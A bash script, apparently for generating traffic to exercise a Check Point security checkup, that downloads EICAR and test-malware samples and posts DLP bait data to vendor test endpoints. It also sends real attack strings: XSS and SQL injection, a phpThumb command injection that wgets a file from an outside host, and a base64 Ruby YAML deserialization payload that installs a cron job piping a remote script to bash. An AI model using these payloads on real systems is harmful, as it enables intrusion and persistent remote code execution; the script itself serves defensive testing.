#!/bin/bash
#Traffic Simulator
#Written by ARose
#Please dont judge my scripting abilities....trust me, I know..

#Cleanup on early termination using ctrl-c
trap ctrl_c INT

function ctrl_c() {
        rm eicarcom2.zip 2> /dev/null
        rm eicar_com 2> /dev/null
        rm eicar.com 2> /dev/null
        rm tempfile.tmp 2> /dev/null
        rm sample-data.xls 2> /dev/null
        rm sample-data.pdf 2> /dev/null
        rm sample-data.csv 2> /dev/null
        rm 1-MB-Test.xlsx 2> /dev/null
        rm 10-MB-Test.xlsx 2> /dev/null
        rm 1-MB-Test.docx 2> /dev/null
        rm 10-MB-Test.docx 2> /dev/null
        rm curlurls.txt 2> /dev/null
        rm file-sample_1MB.docx 2> /dev/null
        rm eicar_com.zip 2> /dev/null
}

for i in `seq 1 5`; do
    sleep 1
    echo -n "."
done

#banners
clear
printf '\033[0m'
echo -e "
 ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗    ██████╗  ██████╗ ██╗███╗   ██╗████████╗
██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝    ██╔══██╗██╔═══██╗██║████╗  ██║╚══██╔══╝
██║     ███████║█████╗  ██║     █████╔╝     ██████╔╝██║   ██║██║██╔██╗ ██║   ██║   
██║     ██╔══██║██╔══╝  ██║     ██╔═██╗     ██╔═══╝ ██║   ██║██║██║╚██╗██║   ██║   
╚██████╗██║  ██║███████╗╚██████╗██║  ██╗    ██║     ╚██████╔╝██║██║ ╚████║   ██║   
 ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝    ╚═╝      ╚═════╝ ╚═╝╚═╝  ╚═══╝   ╚═╝"

sleep 2
printf '\033[0;31m'
echo "
███████╗██╗   ██╗██╗██╗         ████████╗██████╗  █████╗ ███████╗███████╗██╗ ██████╗    ███████╗██╗███╗   ███╗██╗   ██╗██╗      █████╗ ████████╗ ██████╗ ██████╗ 
██╔════╝██║   ██║██║██║         ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██╔════╝██║██╔════╝    ██╔════╝██║████╗ ████║██║   ██║██║     ██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
█████╗  ██║   ██║██║██║            ██║   ██████╔╝███████║█████╗  █████╗  ██║██║         ███████╗██║██╔████╔██║██║   ██║██║     ███████║   ██║   ██║   ██║██████╔╝
██╔══╝  ╚██╗ ██╔╝██║██║            ██║   ██╔══██╗██╔══██║██╔══╝  ██╔══╝  ██║██║         ╚════██║██║██║╚██╔╝██║██║   ██║██║     ██╔══██║   ██║   ██║   ██║██╔══██╗
███████╗ ╚████╔╝ ██║███████╗       ██║   ██║  ██║██║  ██║██║     ██║     ██║╚██████╗    ███████║██║██║ ╚═╝ ██║╚██████╔╝███████╗██║  ██║   ██║   ╚██████╔╝██║  ██║
╚══════╝  ╚═══╝  ╚═╝╚══════╝       ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚═╝ ╚═════╝    ╚══════╝╚═╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
                                                                                                                                                                 
                                                                                                                                                                
"
sleep 2
while true; do
    printf '\033[0m'
    echo "This script is for demonstration purposes only, it is intended to generate data for training on the security checkup tool, it is not for use in any production environment."
    printf '\033[0;31m'
    echo "Use at your own risk"
    read -p "Do you wish to continue? (Y/N)" yn
    case $yn in
        [Yy]* ) break;;
        [Nn]* ) printf '\033[0;0m'; exit;;
        * ) echo "Please answer yes or no.";;
    esac
done
sleep 2
echo "Setting up & testing connectivity...."
sleep 0.7
clear
echo "Setting up & testing connectivity......"
sleep 0.7
clear
echo "Setting up & testing connectivity......."
sleep 0.7
clear
echo "Setting up & testing connectivity........"
clear
printf '\033[0m'
echo -e "
 ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗    ██████╗  ██████╗ ██╗███╗   ██╗████████╗
██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝    ██╔══██╗██╔═══██╗██║████╗  ██║╚══██╔══╝
██║     ███████║█████╗  ██║     █████╔╝     ██████╔╝██║   ██║██║██╔██╗ ██║   ██║   
██║     ██╔══██║██╔══╝  ██║     ██╔═██╗     ██╔═══╝ ██║   ██║██║██║╚██╗██║   ██║   
╚██████╗██║  ██║███████╗╚██████╗██║  ██╗    ██║     ╚██████╔╝██║██║ ╚████║   ██║   
 ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝    ╚═╝      ╚═════╝ ╚═╝╚═╝  ╚═══╝   ╚═╝"

printf '\033[0;31m'
echo "
███████╗██╗   ██╗██╗██╗         ████████╗██████╗  █████╗ ███████╗███████╗██╗ ██████╗    ███████╗██╗███╗   ███╗██╗   ██╗██╗      █████╗ ████████╗ ██████╗ ██████╗ 
██╔════╝██║   ██║██║██║         ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██╔════╝██║██╔════╝    ██╔════╝██║████╗ ████║██║   ██║██║     ██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
█████╗  ██║   ██║██║██║            ██║   ██████╔╝███████║█████╗  █████╗  ██║██║         ███████╗██║██╔████╔██║██║   ██║██║     ███████║   ██║   ██║   ██║██████╔╝
██╔══╝  ╚██╗ ██╔╝██║██║            ██║   ██╔══██╗██╔══██║██╔══╝  ██╔══╝  ██║██║         ╚════██║██║██║╚██╔╝██║██║   ██║██║     ██╔══██║   ██║   ██║   ██║██╔══██╗
███████╗ ╚████╔╝ ██║███████╗       ██║   ██║  ██║██║  ██║██║     ██║     ██║╚██████╗    ███████║██║██║ ╚═╝ ██║╚██████╔╝███████╗██║  ██║   ██║   ╚██████╔╝██║  ██║
╚══════╝  ╚═══╝  ╚═╝╚══════╝       ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚═╝ ╚═════╝    ╚══════╝╚═╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
                                                                                                                                                                 
                                                                                                                                                                
"
echo "Setting up & testing connectivity........"
echo " "
if command -v curl >/dev/null 2>&1 ; then
    echo "dependency check passed"
else
    echo "curl not found, attempting to install..."
    apt-get -s -y install curl
fi
echo " "
read -n 1 -s -r -p "Press any key to begin"
#########################################
#########################################
echo " "
echo "Downloading test data..."
##TEST DATA DOWNLOAD
curl "https://raw.githubusercontent.com/aaronrose18/cpcheckup/master/curlurls.txt" -o curlurls.txt
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" https://dlptest.com/sample-data.xls -o sample-data.xls -m 30.0
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" https://dlptest.com/sample-data.pdf -o sample-data.pdf -m 30.0
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" https://dlptest.com/sample-data.csv -o sample-data.csv -m 30.0
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" http://dlptest.com/1-MB-Test.xlsx -o 1-MB-Test.xlsx -m 30.0
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" http://dlptest.com/10-MB-Test.xlsx -o 10-MB-Test.xlsx -m 30.0
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" http://dlptest.com/1-MB-Test.docx -o 1-MB-Test.docx -m 30.0
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" http://dlptest.com/10-MB-Test.docx -o 10-MB-Test.docx -m 30.0
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" https://file-examples.com/wp-content/uploads/2017/02/file-sample_1MB.docx -o file-sample_1MB.docx -m 30.0

clear
echo "
######                                           #####                                                                  
#     # #    # #    # #    # # #    #  ####     #     # # #    # #    # #        ##   ##### #  ####  #    #             
#     # #    # ##   # ##   # # ##   # #    #    #       # ##  ## #    # #       #  #    #   # #    # ##   #             
######  #    # # #  # # #  # # # #  # #          #####  # # ## # #    # #      #    #   #   # #    # # #  #             
#   #   #    # #  # # #  # # # #  # # #  ###          # # #    # #    # #      ######   #   # #    # #  # #  
#    #  #    # #   ## #   ## # #   ## #    #    #     # # #    # #    # #      #    #   #   # #    # #   ## 
#     #  ####  #    # #    # # #    #  ####      #####  # #    #  ####  ###### #    #   #   #  ####  #    # ### ### ### 
"
echo " "
echo "Running cpcheckme tests..."
#AV IPS Test
printf '\033[0;34m'
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" http://s3-eu-west-1.amazonaws.com/cp-chk-files/e.txt -o tempfile.tmp -# -m 30.0
#AV Test
printf '\033[0;32m'
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" http://s3-eu-west-1.amazonaws.com/cp-chk-files/e.bz2 -o tempfile.tmp -# -m 30.0
printf '\033[0;33m'
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" http://s3-eu-west-1.amazonaws.com/cp-chk-files/e.zip  -o tempfile.tmp -# -m 30.0
printf '\033[0;35m'
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" http://s3-eu-west-1.amazonaws.com/cp-chk-files/win7_64bit_big.com -o tempfile.tmp -# -m 30.0
printf '\033[0;36m'
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" http://s3-eu-west-1.amazonaws.com/cp-chk-files/win7_64bit_big.zip -o tempfile.tmp -# -m 30.0
printf '\033[0;31m'
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" http://s3-eu-west-1.amazonaws.com/cp-chk-files/win7_64bit_big_enc.zip -o tempfile.tmp -# -m 30.0
printf '\033[0;34m'
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" http://s3-eu-west-1.amazonaws.com/cp-chk-files/win7_64bit_big.pdf -o tempfile.tmp -# -m 30.0
printf '\033[0;32m'
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" http://login.msa.akadns6.net/favicon.ico -o tempfile.tmp -# -m 30.0

#AB
printf '\033[0;31m'
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" http://site-to-meet.com/favicon.ico -o tempfile.tmp -# -m 30.0
#TE - need to find a test file that triggers TE
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" http://www.eicar.org/download/eicar.com -o eicar.com -# -m 30.0
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" http://www.eicar.org/download/eicar_com.zip -o eicar_com.zip -# -m 30.0
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" http://www.eicar.org/download/eicarcom2.zip -o eicarcom2.zip -# -m 30.0
rm eicarcom2.zip
rm eicar_com
rm eicar.com
#IPS
printf '\033[0;35m'
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" http://s3-eu-west-1.amazonaws.com/cp-chk-files/1.asp?xss=%3Cscript%3Ealert%28%221%22%29%3C%2Fscript%3E -o tempfile.tmp -# -m 30.0
printf '\033[0;36m'
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" "http://s3-eu-west-1.amazonaws.com/cp-chk-files/1.asp?FileName=a.pdf&AppID=2&MainID=9&SecID=9&MinID=2'%20or%201%3D%2F**%2FcOnVeRt(int,(char(33)+char(126)+char(33)+(char(65)+char(66)+char(67)+char(49)+char(52)+char(53)+char(90)+char(81)+char(54)+char(50)+char(68)+char(87)+char(81)+char(65)+char(70)+char(80)+char(79)+char(73)+char(89)+char(67)+char(70)+char(68))+char(33)+char(126)+char(33))%20COLLATE%20SQL_Latin1_General_Cp1254_CS_AS)%E2%80%94" -o tempfile.tmp -# -m 30.0
printf '\033[0;31m'
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" "http://s3-eu-west-1.amazonaws.com/cp-chk-files/1.asp?src=file.jpg&fltr[]=blur%7C9%20-quality%2075%20-interlace%20line%20fail.jpg%20jpeg%3Afail.jpg%20%3B%20wget%20http%3A%2F%2Fbanthinghiem.vn%2Fwp-content%2Fthemes%2Fpagat.txt%20-O%20pagat.txt%20%3B%20%26phpThumbDebug%3D9" -o tempfile.tmp -# -m 30.0
printf '\033[0;34m'
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" http://s3-eu-west-1.amazonaws.com/cp-chk-files/exploit_page_buffer.html -o tempfile.tmp -# -m 30.0
printf '\033[0;32m'
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" "http://s3-eu-west-1.amazonaws.com/cp-chk-files/getcfg.php?SERVICES=DEVICE.LOG&x=y&AUTHORIZED_GROUP=1" -o tempfile.tmp -# -m 30.0
printf '\033[0;33m'
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" http://s3-eu-west-1.amazonaws.com/cp-chk-files/blockchain.txt -o tempfile.tmp -# -m 30.0
echo " "
printf '\033[0m'
echo "cpcheckme tests complete"
echo "Next Stage: DLP Upload"
#########################################
#########################################
#DLP Tests
read -n 1 -s -r -p "Press any key to begin"
echo "This may take a few minutes..."
echo " "
counter=0
counter=$((counter+1))
echo "DLP Test ${counter} of 16...please wait..."
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" -X POST http://www.cpcheckme.com/check/testsAssets/post.html -d "nid=l0_2d64a0776c78a9c3&kkk=0x06,0x02,0x0,0x12,0xb9,0x81 ,0x3f,0x0f,0xed,0x8a,0x7d,0xdf&fff=" -o tempfile.tmp -# -m 30.0
printf '\033[0;35m'
counter=$((counter+1))
echo "DLP Test ${counter} of 16...please wait..."
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" -X POST http://www.cpcheckme.com/check/testsAssets/post.html -d "creditcard=1234&expyear=2017&ccv=123&pin=1234" -o tempfile.tmp -# -m 30.0
printf '\033[0;36m'
counter=$((counter+1))
echo "DLP Test ${counter} of 16...please wait..."
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" -X POST http://www.cpcheckme.com/check/testsAssets/post.html -d "#include <iostream.h>\r\n#include \"functions.h\"\r\nint main(){\r\nprint_hello();\r\ncout << endl;\r\ncout << \"The factorial of 5 is \" << factorial(5) << endl;\r\nreturn 0;\r\n}\r\n" -o tempfile.tmp -# -m 30.0
printf '\033[0;31m'
counter=$((counter+1))
echo "DLP Test ${counter} of 16...please wait..."
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" -X POST http://www.cpcheckme.com/check/testsAssets/post.html -d "4580-0000-0000-0000, 5500 0000 0000 0004, 4024 0071 0007 2775, 4024007117885730, 4024007186169115" -o tempfile.tmp -# -m 30.0
printf '\033[0;34m'
counter=$((counter+1))
echo "DLP Test ${counter} of 16...please wait..."
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" -X POST http://www.cpcheckme.com/check/testsAssets/post.html -d "4580-0000-0000-0000, 5500 0000 0000 0004, 4024 0071 0007 2775, 4024007117885730, 4024007186169115" -o tempfile.tmp -# -m 30.0
printf '\033[0;32m'
counter=$((counter+1))
echo "DLP Test ${counter} of 16...please wait..."
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" -X POST http://www.cpcheckme.com/check/testsAssets/post.html -d "-----BEGIN RSA PRIVATE KEY-----\r\nXXXXX\r\n-----END RSA PRIVATE KEY-----" -o tempfile.tmp -# -m 30.0
printf '\033[0;33m'
counter=$((counter+1))
echo "DLP Test ${counter} of 16...please wait..."
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" -X POST http://www.cpcheckme.com/check/testsAssets/hatgutifi.com/ls5/forum.php/ -d "GUID=7261968672807068416&BUILD=1409&INFO=CHIMPMUNK-PC @ CHIMPMUNK-PC\alvin.chpmunk&IP=173.66.46.112&TYPE=1&WIN=6.1(x64)" -o tempfile.tmp -# -m 30.0
printf '\033[0;35m'
counter=$((counter+1))
echo "DLP Test ${counter} of 16...please wait..."
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" -X POST http://www.cpcheckme.com/check/testsAssets/opion34.ru/controller.php -d "mode=register_bot&prefix=17&version_sdk=SM-G930F%2F6.0.1+%28%24%24%24Flexnet+v.5.5%29&imei=123400000000000&country=gb&number=12187213456&operator=Dyna" -o tempfile.tmp -# -m 30.0
printf '\033[0;36m'
counter=$((counter+1))
echo "DLP Test ${counter} of 16...please wait..."
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" -X POST http://www.cpcheckme.com/check/testsAssets/ -d "<LJJZMzhFWrliv type='yaml'>--- !ruby/hash:ActionDispatch::Routing::RouteSet::NamedRouteCollection\r\n'QjDwHfre; eval(%[c3lzdGVtKCdjcm9udGFiIC1yOyB3Z2V0IC1WJiZlY2hvICIxICogKiAqICogd2dldCAtcSAtTyAtIGh0dHA6Ly9pbnRlcm5ldHJlc2VhcmNoLmlzL3JvYm90cy50eHQgMj4vZGV2L251bGx8YmFzaCA+L2Rldi9udWxsIDI+JjEifGNyb250YWIgLTt3Z2V0IC1WfHxjdXJsIC1WfGVjaG8gIjEgKiAqICogKiBjdXJsIC1zIGh0dHA6Ly9pbnRlcm5ldHJlc2VhcmNoLmlzL3JvYm90cy50eHQgMj4vZGV2L251bGx8YmFzaCA+L2Rldi9udWxsIDI+JjEifGNyb250YWIgLScpCg==].unpack(%[m0])[0]);' : !ruby/object:OpenStruct\r\ntable:\r\n:defaults: {}\r\n</LJJZMzhFWrliv>" -o tempfile.tmp -# -m 30.0
printf '\033[0;31m'
counter=$((counter+1))
echo "DLP Test ${counter} of 16...please wait..."
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" -F 'field_5u4kh=@sample-data.xls' http://www.cpcheckme.com/check/testsAssets/post.html -o tempfile.tmp -# -m 30.0
printf '\033[0;34m'
counter=$((counter+1))
echo "DLP Test ${counter} of 16...please wait..."
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" -F 'field_5u4kh=@sample-data.pdf' http://www.cpcheckme.com/check/testsAssets/post.html -o tempfile.tmp -# -m 30.0
printf '\033[0;32m'
counter=$((counter+1))
echo "DLP Test ${counter} of 16...please wait..."
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" -F 'field_5u4kh=@sample-data.csv' http://www.cpcheckme.com/check/testsAssets/post.html -o tempfile.tmp -# -m 30.0
printf '\033[0;33m'
counter=$((counter+1))
echo "DLP Test ${counter} of 16...please wait..."
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" -F 'field_5u4kh=@1-MB-Test.xlsx' http://www.cpcheckme.com/check/testsAssets/post.html -o tempfile.tmp -# -m 30.0
printf '\033[0;35m'
counter=$((counter+1))
echo "DLP Test ${counter} of 16...please wait..."
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" -F 'field_5u4kh=@10-MB-Test.xlsx' http://www.cpcheckme.com/check/testsAssets/post.html -o tempfile.tmp -# -m 30.0
printf '\033[0;36m'
counter=$((counter+1))
echo "DLP Test ${counter} of 16...please wait..."
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" -F 'field_5u4kh=@1-MB-Test.docx' http://www.cpcheckme.com/check/testsAssets/post.html -o tempfile.tmp -# -m 30.0
printf '\033[0;36m'
counter=$((counter+1))
echo "DLP Test ${counter} of 16...please wait..."
curl  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36" -F 'field_5u4kh=@10-MB-Test.docx' http://www.cpcheckme.com/check/testsAssets/post.html -o tempfile.tmp -# -m 30.0
clear
printf '\033[0m'
echo "DLP Testing Complete"
sleep 3.0

echo "Next Stage: URL Filtering"
read -n 1 -s -r -p "Press any key to begin"
echo " "
#URLF Master
curl -m 10.0 -K curlurls.txt
read -n 1 -s -r -p "Simulation Complete...Press any key to purge temporary files"
echo"
 ▄▄▄▄▄▄▄▄▄▄▄     ▄▄▄▄              ▄
▐░░░░░░░░░░░▌  ▄█░░░░▌      ▄     ▐░
▐░█▀▀▀▀▀▀▀█░▌ ▐░░▌▐░░▌     ▐░▌   ▐░▌
▐░▌       ▐░▌  ▀▀ ▐░░▌      ▀   ▐░▌ 
▐░█▄▄▄▄▄▄▄█░▌     ▐░░▌         ▐░▌  
▐░░░░░░░░░░░▌     ▐░░▌        ▐░▌   
 ▀▀▀▀▀▀▀▀▀█░▌     ▐░░▌       ▐░▌    
          ▐░▌     ▐░░▌      ▐░▌   ▄ 
 ▄▄▄▄▄▄▄▄▄█░▌ ▄▄▄▄█░░█▄▄▄  ▐░▌   ▐░▌
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌     ▀ 
 ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀        
                                    
"
clear
sleep 0.5
echo "Cleaning up temp files...."
echo "
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄          ▄
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌  ▄     ▐░
▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌ ▐░▌   ▐░▌
▐░▌       ▐░▌          ▐░▌  ▀   ▐░▌ 
▐░█▄▄▄▄▄▄▄█░▌          ▐░▌     ▐░▌  
▐░░░░░░░░░░░▌ ▄▄▄▄▄▄▄▄▄█░▌    ▐░▌   
 ▀▀▀▀▀▀▀▀▀█░▌▐░░░░░░░░░░░▌   ▐░▌    
          ▐░▌▐░█▀▀▀▀▀▀▀▀▀   ▐░▌   ▄ 
 ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄  ▐░▌   ▐░▌
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌     ▀ 
 ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀        
                                    
"
sleep 0.5
clear
echo "Cleaning up temp files....."
echo "
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄          ▄
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌  ▄     ▐░
▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌ ▐░▌   ▐░▌
▐░▌       ▐░▌          ▐░▌  ▀   ▐░▌ 
▐░█▄▄▄▄▄▄▄█░▌ ▄▄▄▄▄▄▄▄▄█░▌     ▐░▌  
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌    ▐░▌   
 ▀▀▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌   ▐░▌    
          ▐░▌          ▐░▌  ▐░▌   ▄ 
 ▄▄▄▄▄▄▄▄▄█░▌ ▄▄▄▄▄▄▄▄▄█░▌ ▐░▌   ▐░▌
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌     ▀ 
 ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀        
                                    
"
sleep 0.5
clear
echo "Cleaning up temp files......"
echo "
 ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄          ▄
▐░░░░░░░░░░░▌▐░▌       ▐░▌  ▄     ▐░
▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌ ▐░▌   ▐░▌
▐░▌       ▐░▌▐░▌       ▐░▌  ▀   ▐░▌ 
▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌     ▐░▌  
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌    ▐░▌   
 ▀▀▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌   ▐░▌    
          ▐░▌          ▐░▌  ▐░▌   ▄ 
 ▄▄▄▄▄▄▄▄▄█░▌          ▐░▌ ▐░▌   ▐░▌
▐░░░░░░░░░░░▌          ▐░▌▐░▌     ▀ 
 ▀▀▀▀▀▀▀▀▀▀▀            ▀  ▀        
                                    
"
sleep 0.5
clear
echo "Cleaning up temp files......."
echo "
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄          ▄
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌  ▄     ▐░
▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀  ▐░▌   ▐░▌
▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄   ▀   ▐░▌ 
▐░█▄▄▄▄▄▄▄█░▌▐░░░░░░░░░░░▌     ▐░▌  
▐░░░░░░░░░░░▌ ▀▀▀▀▀▀▀▀▀█░▌    ▐░▌   
 ▀▀▀▀▀▀▀▀▀█░▌          ▐░▌   ▐░▌    
          ▐░▌          ▐░▌  ▐░▌   ▄ 
 ▄▄▄▄▄▄▄▄▄█░▌ ▄▄▄▄▄▄▄▄▄█░▌ ▐░▌   ▐░▌
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌     ▀ 
 ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀        
                                    
"
sleep 0.5
clear
rm sample-data.xls 2> /dev/null
